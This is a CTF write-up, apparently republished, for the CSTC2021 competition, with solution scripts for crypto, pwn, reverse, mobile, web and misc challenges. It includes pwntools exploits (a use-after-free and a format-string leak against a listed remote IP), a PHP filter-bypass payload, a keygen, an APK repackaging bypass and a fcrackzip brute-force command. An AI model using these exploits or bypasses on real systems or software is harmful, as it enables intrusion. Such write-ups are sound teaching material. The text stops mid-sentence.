# CSTC2021 By T3ns0r

阅读量 **555658**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-02 16:30:59

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01fe418fca48ff1316.jpg)

## Crypto

###  easySteram

先用hint.txt给的五组文件名，通过LCG的crack_unknown_modulus手法求出对应的a，b，n。再通过递推求出所有的key，最后用和CISCN2018的oldstreamgame几乎一样的脚本来打LFSR，结果转成八进制去掉开头的零再md5加密，用flag{}包裹提交

exp如下：

    
    
    #coding=utf-8
    from Crypto.Util.number import *
    from gmpy2 import *
    def crack_unknown_increment(states, modulus, multiplier):
        increment = (states[1] - states[0]*multiplier) % modulus
        return modulus, multiplier, increment
    def crack_unknown_multiplier(states, modulus):
        multiplier = (states[2] - states[1]) * invert(states[1] - states[0], modulus) % modulus 
        return crack_unknown_increment(states, modulus, multiplier)
    def crack_unknown_modulus(states):
        diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]
        zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]
        modulus = abs(reduce(gcd, zeroes))
        return crack_unknown_multiplier(states, modulus)
    s = [3552318300093355576,7287716593817904745,10709650189475092178,9473306808836439162,7033071619118870]
    n, a, b = crack_unknown_modulus(s)
    k = s[0]
    key = ''
    kk = []
    kk.append(s[0])
    f = open('./key/'+str(s[0]), 'rb')
    key += f.read()
    for i in range(999):
        k = (a*k+b)%n
        f = open('./key/'+str(k), 'rb')
        key += f.read()
        kk.append(k)
    key = bin(bytes_to_long(key))[2:][:48]
    flag = []
    for i in range(48):
        temp='1'+''.join(flag)+key[:47-len(flag)]
        if int(temp[0])^int(temp[2])^int(temp[4])^int(temp[8])^int(temp[13])^int(temp[17])^int(temp[20])^int(temp[24])^int(temp[30])^int(temp[32])^int(temp[36])^int(temp[40])^int(temp[41])^int(temp[46]) == int(key[47-len(flag)]):
            flag.insert(0,'1')
        else:
            flag.insert(0,'0')
    print(oct(eval('0b'+''.join(flag))))
    # 06352070104365057
    from hashlib import *
    print(md5('6352070104365057'.encode()).hexdigest())
    # 6b95bf3c5128f247cb64d5f3b2c4e83f
    # flag{6b95bf3c5128f247cb64d5f3b2c4e83f}
    

###  bad-curve

log很小，爆破即可

exp如下：

    
    
    from Crypto.Cipher import AES 
    from tqdm import tqdm
    cipher = b'\x1f\x02\x9fYy\xd3\xb0\r\xbf&O\x18\xef\x9e\\+_(\x94\x071\x84\x97\xa9\xf9\xe3h\xbf\x81\xb2\x93J\\\x8c9\x96\x17\xc2\xe2\xfb\xbaaq\xc0\x8fvdC'
    for log in tqdm(range(1000000)):
        aes=AES.new(int(log).to_bytes(16,'big'), AES.MODE_CBC, bytes(16))
        flag = aes.decrypt(cipher)
        if flag[:5] == b'flag{':
            print(flag)
            exit()
    # b'flag{eb3584ff07526fc0037819c857f10144}\n\n\n\n\n\n\n\n\n\n'
    

###  RSA2

先用e1=3的Related Message Attack求出所有满足条件的e2，然后第二部分在CTFwiki上找到了一个几乎一样的原题2018
CodeGate CTF Rsababy，直接一把梭

exp如下：

    
    
    from gmpy2 import *
    def getM2(a,b,c1,c2,n):
        a3 = pow(a,3,n)
        b3 = pow(b,3,n)
        first = c1-a3*c2+2*b3
        first = first % n
        second = 3*b*(a3*c2-b3)
        second = second % n
        third = second*invert(first,n)
        third = third % n
        fourth = (third+b)*invert(a,n)
        return fourth % n
    a = 1
    c1 = 8321449807360182827125
    c2 = 8321441183828895770712
    n = 378094963578091245652286477316863605753157432437621367359342302751615833557269627727449548734187939542588641672789504086476494927855747407344197241746889123693358997028141479289459947165818881146467218957546778123656120190207960702225556466771501844979094137868818924556860636212754616730115341674681116573326890134855072314950288530400350483394140781434097516134282100603979066057391672872913866678519235744668652042193736205044674422210689619562242862928626697711582401250962536787125165979017740138070213899305175933585261127763164192929103624167063213758551239415744211455417108907505646457646161227272639379721764779734013149963229002406400371319674194009206372087547010201440035410745572669645666856126204769178179570446069571090298945041726576151255620825221663591127702492882834949100599423704250729752444923956601971323645242934249137015933524911614158989705977723056398299344849153945858516695027157652464450872079484515561281333287781393423326046633891002695625031041881639987758851943448352789469117137668229144914356042850963002345804817204906458653402636643504354041188784842235312540435896510716835069861282548640947135457702591305281493685478066735573429735004662804458309301038827671971059369532684924420835204769329
    e2 = []
    # for b in range(105):
    #     for p in range(20210401, 20210505):
    #         e = getM2(a,b,c1,c2,n) - p
    #         if is_prime(e) and e>50000 and e<60000:
    #             e2.append(e)
    # print(e2)
    e2 = [53951, 53939, 53927, 53923, 53917, 53899, 53897, 53891, 53887, 53881, 53861, 53857]
    h = 73848642434738867367477225086726888395852920758614133495828335507877859511862002848037040713538347334802971992946443655728951228215538557683172582670964297757897239619386044898759264210423339349230213909268805339389420150987118078950524911018047255588024612603547365858714122701018350042307021931058343380562835003665731568505773484122782553098643140312700105413000212984821873751937531991369317400032403465633780535286923404386459988367374340142852850593284541563858829367072310534803205896401476440899512604526967410832990327872756442819020392626930518136601018466180890464963004282304763488756943631269919832869202
    g = 3976547671387654068675440379770742582328834393823569801056509684207489138919660098684138301408123275651176128285451251938825197867737108706539707501679646427880324173378500002196229085818500327236191128852790859809972892359594650456622821702698053681562517351687421071768373342718445683696079821352735985061279190431410150014034774435138495065087054406766658209697164984912425266716387767166412306023197815823087447774319129788618337421037953552890681638088740575829299105645000980901907848598340665332867294326355124359170946663422578346790893243897779634601920449118724146276125684875494241084873834549503559924080309955659918449396969802766847582242135030406950869122744680405429119205293151092844435803672994194588162737131647334232277272771695918147050954119645545176326227537103852173796780765477933255356289576972974996730437181113962492499106193235475897508453603552823280093173699555893404241432851568898226906720101475266786896663598359735416188575524152248588559911540400610167514239540278528808115749562521853241361159303154308894067690191594265980946451318139963637364985269694659506244498804178767180096195422200695406893459502635969551760301437934119795228790311950304181431019690890246807406970364909654718663130558117158600409638504924084063884521237159579000899800018999156006858972064226744522780397292283123020800063335841101274936236800443981678756303192088585798740821587192495178437647789497048969720110685325336457005611803025549386897596768084757320114036370728368369612925685987251541629902437275412553261624335378768669846356507330025425467339014984330079364067149950238561943275006049728406278318846998650496707162387768801213108565185221147664770009978012050906904959264045050100404522270495606970447076283894255951481388496134870426452215997834228869196114684962261076716651779120620585343304887755029463545328534291186
    from libnum import *
    c = 141187369139586875794438918220657717715220514870544959295835385681523005285553297337947377472083695018833866941104904071675141602626896418932763833978914936423338696805941972488176008847789235165341165167654579559935632669335588215515509707868555632337151209369075754122977694992335834572329418404770856890386340258794368538033844221701815983303376617825048502634692029763947325144731383655217790212434365368739783525966468588173561230342889184462164098771136271291295174064537653917046323835004970992374805340892669139388917208009182786199774133598205168195885718505403022275261429544555286425243213919087106932459624050446925210285141483089853704834315135915923470941314933036149878195756750758161431829674946050069638069700613936541544516511266279533010629117951235494721973976401310026127084399382106355953644368692719167176012496105821942524500275322021731162064919865280000886892952885748100715392787168640391976020424335319116533245350149925458377753639177017915963618589194611242664515022778592976869804635758366938391575005644074599825755031037848000173683679420705548152688851776996799956341789624084512659036333082710714002440815131471901414887867092993548663607084902155933268195361345930120701566170679316074426182579947
    n = 378094963578091245652286477316863605753157432437621367359342302751615833557269627727449548734187939542588641672789504086476494927855747407344197241746889123693358997028141479289459947165818881146467218957546778123656120190207960702225556466771501844979094137868818924556860636212754616730115341674681116573326890134855072314950288530400350483394140781434097516134282100603979066057391672872913866678519235744668652042193736205044674422210689619562242862928626697711582401250962536787125165979017740138070213899305175933585261127763164192929103624167063213758551239415744211455417108907505646457646161227272639379721764779734013149963229002406400371319674194009206372087547010201440035410745572669645666856126204769178179570446069571090298945041726576151255620825221663591127702492882834949100599423704250729752444923956601971323645242934249137015933524911614158989705977723056398299344849153945858516695027157652464450872079484515561281333287781393423326046633891002695625031041881639987758851943448352789469117137668229144914356042850963002345804817204906458653402636643504354041188784842235312540435896510716835069861282548640947135457702591305281493685478066735573429735004662804458309301038827671971059369532684924420835204769329
    const = 0xdeadbeef
    for e in e2:
        tmp = pow(2,e*g+const-1,n)-1
        p = gcd(tmp,n)
        q = n//p
        phin = (p-1)*(q-1)
        if gcd(e, phin) == 1:
            d =invert(e,phin)
            print(n2s(pow(c, d, n)))
    # flag{9589c8d322c2a1ff8a4e85d767bf6912}*******************************************************************************************************************************************************************************************
    

## Pwn

###  paper

思路很简单，有显而易见的free指针未清零，只要构造uaf后分配到变量v8的空间，再输入无符号整数完成`v8 ==
0xCCCCCCCC`的条件即可，fastbin的检测可以用choice 5绕过，地址可以在choice 4看到

exp如下

    
    
    from pwn import *
    import sys, time
    
    context(arch='amd64',os='linux',log_level='debug')
    context.log_level = 'debug'
    
    debug = 0
    if debug:
        elf = ELF("./paper")
        libc = ELF("./libc.so.6")
        io = process(elf.path)
    else:
        elf = ELF("./paper")
        libc = ELF("./libc.so.6")
        io = remote("81.70.195.166",10003)
    
    ################################################
    s = io.send                                    #
    sl = io.sendline                               #
    sa = io.sendafter                              #
    sla = io.sendlineafter                         #
    r = io.recv                                    #
    rl = io.recvline                               #
    ru = io.recvuntil                              #
    it = io.interactive                            #
    ################################################
    
    add = lambda  : (sla("choice > ","1"))
    write = lambda index,num : (sla("choice > ","3"),sla("Index:",str(index)),sla("count:",str(num)))
    delate = lambda index : (sla("choice > ","2"),sla("Index:",str(index)))
    
    def change():
        sla("choice > ","5")
        sla("Which disk?","33")
    
    sla("choice > ","4")
    ru("Your disk is at: ")
    addr = int(r(14),16) - 0x8
    print(str(addr))
    log.warn("addr --> 0x%x" % addr)
    # 140737488346168 0x7fffffffdc38
    add()
    add()
    add()
    delate(0)
    delate(1)
    delate(2)
    change()
    
    write(2,addr)
    
    add()
    add()
    write(4,3435973836)
    #3435973836
    
    
    io.interactive()
    

###  bank

本题需要过check，然后题目会读取flag文件，我们只需要获取这段字符串即可

首先需要爆破，用\x00过strcmp，然后输入yes过第二个，最后用格式化字符串漏洞读取出栈上的flag即可

exp如下

    
    
    from pwn import * 
    from LibcSearcher import *
    context(os='linux',arch='amd64',log_level='debug')
    
    while True:
        ms = process("./bank")
        #ms = remote("81.70.195.166",10000)
        ms.sendlineafter("Please enter your account:\n",'a')
        ms.sendlineafter("Please enter your password:\n",'\x00'+'aaa')
        if ms.recvline() == "Do you want to check your account balance?\n":
            ms.sendline("yes")
            ms.sendlineafter("Please input your private code: \n","%8$s")
            #ms.sendlineafter("Please input your private code: \n","aa"+"%p"*9)
            flag = ms.recv(100)
            print(flag)
            exit()
        ms.close()
    ms.interactive()
    

## Reverse

以下均展示md5之前的flag

###  ck

观察几个函数之后发现一个疑似base64的编码算法

![](https://p2.ssl.qhimg.com/t019e0eedc3808c0ed8.png)

直接跟进去看看哪个编码表，恰好是64个字节，但是不是标准的表，应该是变种base64八九不离十了

![](https://p2.ssl.qhimg.com/t01a1a470d260f303a4.png)

直接上脚本，换下编码表表试试（密文在output文件里）

    
    
    # coding:utf-8
    
    #s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    
    s = ",.0fgWV#`/1Heox$~\"2dity%_;j3csz^+@{4bKrA&=}5laqB*-[69mpC()]78ndu"
    print(len(s))
    
    def My_base64_encode(inputs):
        # 将字符串转化为2进制
        bin_str = []
        for i in inputs:
            x = str(bin(ord(i))).replace('0b', '')
            bin_str.append('{:0>8}'.format(x))
        # print(bin_str)
        # 输出的字符串
        outputs = ""
        # 不够三倍数，需补齐的次数
        nums = 0
        while bin_str:
            # 每次取三个字符的二进制
            temp_list = bin_str[:3]
            if (len(temp_list) != 3):
                nums = 3 - len(temp_list)
                while len(temp_list) < 3:
                    temp_list += ['0' * 8]
            temp_str = "".join(temp_list)
            # print(temp_str)
            # 将三个8字节的二进制转换为4个十进制
            temp_str_list = []
            for i in range(0, 4):
                temp_str_list.append(int(temp_str[i * 6:(i + 1) * 6], 2))
            # print(temp_str_list)
            if nums:
                temp_str_list = temp_str_list[0:4 - nums]
    
            for i in temp_str_list:
                outputs += s[i]
            bin_str = bin_str[3:]
        outputs += nums * '='
        print("Encrypted String:\n%s " % outputs)
    
    
    def My_base64_decode(inputs):
        # 将字符串转化为2进制
        bin_str = []
        for i in inputs:
            if i != '=':
                x = str(bin(s.index(i))).replace('0b', '')
                bin_str.append('{:0>6}'.format(x))
        # print(bin_str)
        # 输出的字符串
        outputs = ""
        nums = inputs.count('=')
        while bin_str:
            temp_list = bin_str[:4]
            temp_str = "".join(temp_list)
            # print(temp_str)
            # 补足8位字节
            if (len(temp_str) % 8 != 0):
                temp_str = temp_str[0:-1 * nums * 2]
            # 将四个6字节的二进制转换为三个字符
            for i in range(0, int(len(temp_str) / 8)):
                outputs += chr(int(temp_str[i * 8:(i + 1) * 8], 2))
            bin_str = bin_str[4:]
        print("Decrypted String:\n%s " % outputs)
    
    
    print()
    print("     *************************************")
    print("     *    (1)encode         (2)decode    *")
    print("     *************************************")
    print()
    
    num = input("Please select the operation you want to perform:\n")
    if (num == "1"):
        input_str = input("Please enter a string that needs to be encrypted: \n")
        My_base64_encode(input_str)
    else:
        input_str = input("Please enter a string that needs to be decrypted: \n")
        My_base64_decode(input_str)
    

直接出了hh

![](https://p2.ssl.qhimg.com/t01d9618f381e8b5ac9.png)

###  free_flag

先看看主函数：ID直接给了，11337，然后需要一个Pin（就是flag），关键函数是checkpin

![](https://p2.ssl.qhimg.com/t015c80d712d9b44626.png)

跟进看checkpin函数，就是个简单的异或0xC,密文也给出来了

![](https://p4.ssl.qhimg.com/t0105f223505bb408c2.png)

####  exp

![](https://p0.ssl.qhimg.com/t01abcd87273b566052.png)

###  crackme

看到主要逻辑函数，静态分析：大概逻辑就是用`crackme`的前5位即`crack`做一下变换（如下注释），得到一个10字节的表，再利用这个表做一些加密变换得到最终的目标serial

    
    
    LRESULT __stdcall sub_401109(HWND hWndParent, UINT Msg, WPARAM wParam, LPARAM lParam)
    {
      int v4; // ebx
      int v5; // eax
      char v6; // al
      char v7; // al
      int v8; // edx
      char v9; // cl
      int v10; // edx
      char v11; // al
      char v12; // cl
      __int16 v13; // ax
      int i; // ecx
      CHAR serial_i; // bl
      char v16; // dl
      char v17; // dl
    
      switch ( Msg )
      {
        case 2u:
          PostQuitMessage(0);
          break;
        case 1u:
          CreateWindowExA(0x200u, aEdit, 0, 0x50800080u, 15, 15, 255, 25, hWndParent, (HMENU)2, hInstance, 0);
          dword_403134 = SetDlgItemTextA(hWndParent, 2, String);
          CreateWindowExA(0x200u, aEdit, 0, 0x50800080u, 15, 50, 255, 25, hWndParent, (HMENU)4, hInstance, 0);
          dword_403134 = SetDlgItemTextA(hWndParent, 4, aEnterSerial);
          dword_403138 = (int)CreateWindowExA(
                                0x200u,
                                aButton,
                                aTry,
                                0x50800000u,
                                15,
                                85,
                                255,
                                25,
                                hWndParent,
                                (HMENU)3,
                                hInstance,
                                0);
          v4 = (unsigned int)(GetSystemMetrics(0) - 290) >> 1;
          v5 = GetSystemMetrics(1);
          SetWindowPos(hWndParent, 0, v4, (unsigned int)(v5 - 150) >> 1, 290, 150, 0x40u);
          break;
        case 273u:
          if ( wParam == 3 )
          {
            v6 = GetDlgItemTextA(hWndParent, 2, table, 40);
            if ( v6 )
            {
              if ( v6 > 32 )
              {
                MessageBoxA(0, aNameCanBeMax32, aSorry, 0);
              }
              else if ( v6 < 5 )
              {
                MessageBoxA(0, aNameMustBeMin5, aSorry, 0);
              }
              else
              {
                v7 = 5;
                v8 = 0;
                do
                {
                  v9 = v7 + (table[v8] ^ 0x29);     // text[i] ^ 0x29
                  if ( v9 < 65 || v9 > 90 )
                    v9 = v7 + 82;                   // 非大写字母 +82
                  name[v8] = v9;
                  byte_40313D[v8] = 0;
                  LOBYTE(v8) = v8 + 1;
                  --v7;
                }
                while ( v7 );
                v10 = 0;
                v11 = 5;
                do
                {
                  v12 = v11 + (table[v10] ^ 0x27) + 1;// (text[i] ^ 0x27) +1
                  if ( v12 < 65 || v12 > 90 )
                    v12 = v11 + 77;                 // 非大写字母 +77
                  byte_403141[v10] = v12;
                  byte_403142[v10] = 0;
                  LOBYTE(v10) = v10 + 1;
                  --v11;
                }
                while ( v11 );
                v13 = GetDlgItemTextA(hWndParent, 4, serial, 40);
                if ( v13 && v13 <= 10 && v13 >= 10 )
                {
                  i = 0;
                  while ( 1 )
                  {
                    serial_i = serial[i];
                    if ( !serial_i )
                      break;
                    v16 = name[i] + 5;
                    if ( v16 > 0x5A )
                      v16 = name[i] - 8;
                    v17 = v16 ^ 0xC;
                    if ( v17 < 0x41 )
                    {
                      v17 = i + 75;
                    }
                    else if ( v17 > 0x5A )
                    {
                      v17 = 75 - i;
                    }
                    ++i;
                    if ( v17 != serial_i )
                      goto LABEL_35;
                  }
                  MessageBoxA(0, aSerialIsCorrec, aGoodCracker, 0);
                }
                else
                {
    LABEL_35:
                  MessageBoxA(0, Text, Caption, 0);
                }
              }
            }
            else
            {
              MessageBoxA(0, aEnterName_0, aSorry, 0);
            }
          }
          break;
        default:
          return DefWindowProcA(hWndParent, Msg, wParam, lParam);
      }
      return 0;
    }
    

####  exp

    
    
    name = 'crack'
    flag=''
    n=5
    for i in range(5):
        ch = n+ (ord(name[i]) ^ 0x29)
        if ch<65 or ch>90:
            ch += 82
        flag += chr(ch)
        n -= 1
    n=5
    for i in range(5):
        ch = n + (ord(name[i]) ^ 0x27) + 1
        if ch<65 or ch>90:
            ch += 77
        flag += chr(ch)
        n -= 1
    for i in flag:
        print(ord(i))
    for i in range(10):
        tmp=ord(flag[i]) +5
        if tmp > 90:
            tmp = ord(flag[i]) - 8
        tmp ^= 0xc
        if tmp <65:
            tmp = i+75
        elif tmp >90:
            tmp = 75-i
        print(chr(tmp),end='')
    print()
    

输出结果为：

    
    
    79
    177
    75
    76
    67
    74
    90
    74
    71
    78
    XJIHDCECSB
    

得到的serial第2个字节很怪，XJIHDCECSB输入进去也不对，就动调得到第二位的结果 ’B‘

![](https://p2.ssl.qhimg.com/t0190476ad14fb70a7a.png)

其他位都没错，所以最终结果是：`XBIHDCECSB`

###  Maze

迷宫题无疑，先看主函数

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      __int64 v3; // rax
      int v5[52]; // [rsp+0h] [rbp-270h] BYREF
      int v6[52]; // [rsp+D0h] [rbp-1A0h] BYREF
      int v7[7]; // [rsp+1A0h] [rbp-D0h] BYREF
      int v8; // [rsp+1BCh] [rbp-B4h]
      int v9; // [rsp+1C0h] [rbp-B0h]
      int v10; // [rsp+1C4h] [rbp-ACh]
      int v11; // [rsp+1C8h] [rbp-A8h]
      int v12; // [rsp+1CCh] [rbp-A4h]
      int v13; // [rsp+1D0h] [rbp-A0h]
      int v14; // [rsp+1D4h] [rbp-9Ch]
      int v15; // [rsp+1D8h] [rbp-98h]
      int v16; // [rsp+1DCh] [rbp-94h]
      int v17; // [rsp+1E0h] [rbp-90h]
      int v18; // [rsp+1E4h] [rbp-8Ch]
      int v19; // [rsp+1E8h] [rbp-88h]
      int v20; // [rsp+1ECh] [rbp-84h]
      int v21; // [rsp+1F0h] [rbp-80h]
      int v22; // [rsp+1F4h] [rbp-7Ch]
      int v23; // [rsp+1F8h] [rbp-78h]
      int v24; // [rsp+1FCh] [rbp-74h]
      int v25; // [rsp+200h] [rbp-70h]
      int v26; // [rsp+204h] [rbp-6Ch]
      int v27; // [rsp+208h] [rbp-68h]
      int v28; // [rsp+20Ch] [rbp-64h]
      int v29; // [rsp+210h] [rbp-60h]
      int v30; // [rsp+214h] [rbp-5Ch]
      int v31; // [rsp+218h] [rbp-58h]
      int v32; // [rsp+21Ch] [rbp-54h]
      int v33; // [rsp+220h] [rbp-50h]
      int v34; // [rsp+224h] [rbp-4Ch]
      int v35; // [rsp+228h] [rbp-48h]
      int v36; // [rsp+22Ch] [rbp-44h]
      int v37; // [rsp+230h] [rbp-40h]
      int v38; // [rsp+234h] [rbp-3Ch]
      int v39; // [rsp+238h] [rbp-38h]
      int v40; // [rsp+23Ch] [rbp-34h]
      int v41; // [rsp+240h] [rbp-30h]
      int v42; // [rsp+244h] [rbp-2Ch]
      int v43; // [rsp+248h] [rbp-28h]
      int v44; // [rsp+24Ch] [rbp-24h]
      int v45; // [rsp+250h] [rbp-20h]
      int v46; // [rsp+254h] [rbp-1Ch]
      int v47; // [rsp+258h] [rbp-18h]
      int v48; // [rsp+25Ch] [rbp-14h]
      int v49; // [rsp+260h] [rbp-10h]
    
      v7[0] = 1;
      v7[1] = 1;
      v7[2] = -1;
      v7[3] = 1;
      v7[4] = -1;
      v7[5] = 1;
      v7[6] = -1;
      v8 = 0;
      v9 = 0;
      v10 = 0;
      v11 = 0;
      v12 = 1;
      v13 = -1;
      v14 = 0;
      v15 = 0;
      v16 = 1;
      v17 = 0;
      v18 = 0;
      v19 = 1;
      v20 = 0;
      v21 = -1;
      v22 = -1;
      v23 = 0;
      v24 = 1;
      v25 = 0;
      v26 = 1;
      v27 = -1;
      v28 = 0;
      v29 = -1;
      v30 = 0;
      v31 = 0;
      v32 = 0;
      v33 = 0;
      v34 = 0;
      v35 = 1;
      v36 = -1;
      v37 = -1;
      v38 = 1;
      v39 = -1;
      v40 = 0;
      v41 = -1;
      v42 = 2;
      v43 = 1;
      v44 = -1;
      v45 = 0;
      v46 = 0;
      v47 = -1;
      v48 = 1;
      v49 = 0;
      memset(v6, 0, 0xC0uLL);
      v6[48] = 0;
      memset(v5, 0, 0xC0uLL);
      v5[48] = 0;
      Step_0((int (*)[7])v7, 7, (int (*)[7])v6);
      Step_1((int (*)[7])v6, 7, (int (*)[7])v5);
      v3 = std::operator<<<std::char_traits<char>>(&_bss_start, "Please help me out!");
      std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
      Step_2((int (*)[7])v5);
      system("pause");
      return 0;
    }
    

基本能猜到是个7*7的迷宫了，看关键的`step_2`

    
    
    __int64 __fastcall Step_2(int (*a1)[7])
    {
      int v1; // eax
      __int64 v2; // rax
      __int64 v3; // rax
      __int64 result; // rax
      __int64 v5; // rax
      char v6[35]; // [rsp+10h] [rbp-30h] BYREF
      char v7; // [rsp+33h] [rbp-Dh] BYREF
      int v8; // [rsp+34h] [rbp-Ch]
      int lie; // [rsp+38h] [rbp-8h]
      int hang; // [rsp+3Ch] [rbp-4h]
    
      hang = 0;
      lie = 0;
      v8 = 0;
      while ( v8 <= 29 && (*a1)[7 * hang + lie] == 1 )
      {
        std::operator>><char,std::char_traits<char>>(&std::cin, &v7);
        v1 = v8++;
        v6[v1] = v7;
        if ( v7 == 'd' )
        {
          ++lie;
        }
        else if ( v7 > 100 )
        {
          if ( v7 == 's' )
          {
            ++hang;
          }
          else
          {
            if ( v7 != 'w' )
              goto LABEL_14;
            --hang;
          }
        }
        else if ( v7 == 'a' )
        {
          --lie;
        }
        else
        {
    LABEL_14:
          v2 = std::operator<<<std::char_traits<char>>(&_bss_start, "include illegal words.");
          std::ostream::operator<<(v2, 0x7FCE24821860uLL);
        }
      }
      if ( hang == 6 && lie == 6 )
      {
        v3 = std::operator<<<std::char_traits<char>>(&_bss_start, "Congratulations!");
        std::ostream::operator<<(v3, 0x7FCE24821860uLL);
        output(v6, v8);
        result = 1LL;
      }
      else
      {
        v5 = std::operator<<<std::char_traits<char>>(&_bss_start, "Oh no!,Please try again~~");
        std::ostream::operator<<(v5, 0x7FCE24821860uLL);
        result = 0LL;
      }
      return result;
    }
    

wasd控制上左下右，终点在（6，6），’1‘为可通路径，地图我也没看怎么来的，直接动调得到

####  exp

    
    
    maze1 = [0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x01, 0x00, 0x00, 0x00]
    maze=[]
    for i in range(len(maze1)):
        if i % 4==0:
            maze.append(maze1[i])         # 提取地图
    print(len(maze))
    for i in range(len(maze)):
        print(maze[i],end='')            #输出7*7地图
        if i % 7 ==6:
            print()
    
    '''
    1001111
    1011001
    1110111
    0001100
    1111000
    1000111
    1111101
    '''
    
    #path=ssddwdwdddssaasasaaassddddwdds
    

flag 就是path

## Mobile

###  Mobile 2

只给了一个dex，于是乎丢到jadx反编译。发现有问题(File not open)，又丢到mt管理器康康，问题依旧：

![](https://p4.ssl.qhimg.com/t014f9701c7def22092.png)

这么康来应该是文件结构出错，于是乎丢到010editor，发现有两处偏移被置空

![](https://p4.ssl.qhimg.com/t01f7371ee31efa3751.png)

找找下面的class结构体和method结构体，把偏移补上去

![](https://p0.ssl.qhimg.com/t014bbf775c7d856757.png)

![](https://p2.ssl.qhimg.com/t0179b916bdf8d199b7.png)

再丢jadx，有逻辑了

![](https://p0.ssl.qhimg.com/t011227e83aa99d12dc.png)

前面的input检查都是幌子，直接跑一遍红色框的过程就行，复制到eclipse运行，得到flag：

    
    
    flag{59acc538825054c7de4b26440c0999dd}
    

###  Mobile 3

只有一个apk，丢进模拟器跑跑，发现是个注册机

![](https://p0.ssl.qhimg.com/t014901f595c6fffc62.png)

丢进GDA反编译，发现comfirm函数：

![](https://p2.ssl.qhimg.com/t01ca6584b4a3dce7b0.png)

username和sn填充8位和32位随机数，猜对了进入subactivity，那不妨直接进入subactivity瞅瞅有啥

![](https://p5.ssl.qhimg.com/t0135444ff1d8c0b56c.png)

大概目的是从assets中的logo.png中复制出数组。于是乎丢apk到Android
Killer，找到confirm函数，将其smali代码清空仅留下初始化subactivity的相关语句

![](https://p2.ssl.qhimg.com/t018edc3e703ac054b3.png)

重打包后安装，直接确定，得到flag：

![](https://p0.ssl.qhimg.com/t01ca65bdb248fcf366.png)

## Web

###  easyweb

打开题目是代码审计：

    
    
    <?php
    show_source(__FILE__);
    $v1=0;$v2=0;$v3=0;
    $a=(array)json_decode(@$_GET['foo']);
    if(is_array($a)){
       is_numeric(@$a["bar1"])?die("nope"):NULL;
       if(@$a["bar1"]){
           ($a["bar1"]>2021)?$v1=1:NULL;
       }
       if(is_array(@$a["bar2"])){
           if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope");
           $pos = array_search("nudt", $a["a2"]);
           $pos===false?die("nope"):NULL;
           foreach($a["bar2"] as $key=>$val){
               $val==="nudt"?die("nope"):NULL;
           }
           $v2=1;
       }
    }
    $c=@$_GET['cat'];
    $d=@$_GET['dog'];
    if(@$c[1]){
       if(!strcmp($c[1],$d) && $c[1]!==$d){
           eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
           strpos(($c[0].$d), "cstc2021")?$v3=1:NULL;
       }
    }
    if($v1 && $v2 && $v3)
    {
       include "flag.php";
       echo $flag;
    }
    ?>
    

主要就是绕过三层，第一层好绕：`bar1=2022a`
，第二层保证bar2有5个元素，并且第一个是数组，也好绕。我们让`bar2=[[1],2,3,4,0]` ，第三层看到 `eregi()`
函数，想到是php5版本，可能存在 %00截断，尝试一下发现可以。。

我们传`?cat[1][]=1&cat[0]=cstc2021&dog=%00`

最后的payload:
`49.232.167.183:30001/?foo={"bar1":"2022a","bar2":[[1\],2,3,4,0]}&cat[1][]=1&dog=%00&cat[0]="cstc2021"`

## Misc

###  RGB

下载附件是`code.txt`，打开发现是RGB数字，之前做过类似的题，直接就是Python脚本转一下图片：

    
    
    from PIL import Image
    x = 704
    y = 41
    image = Image.new("RGB",(x,y))
    f = open('code.txt') 
    for i in range(0,x):
        for j in range(0,y):
            l = f.readline()
            r = l.split("#")
            image.putpixel((i,j),(int(r[0]),int(r[1]),int(r[2])))
    image.save('image.jpg')
    

flag{c1d836d1db9d42dd}

###  zip

下载下来是一个带密码的压缩包，试了一下伪加密不太行，然后就尝试用工具来爆破密码

`fcrackzip -b -c '1a' -l 1-5 -u zip.zip`

爆破出来密码是 `ff123` ，然后解压发现里面有一个加密的doc文件和txt，txt的内容是：

有点像培根加密，拿到在线网站试一下：

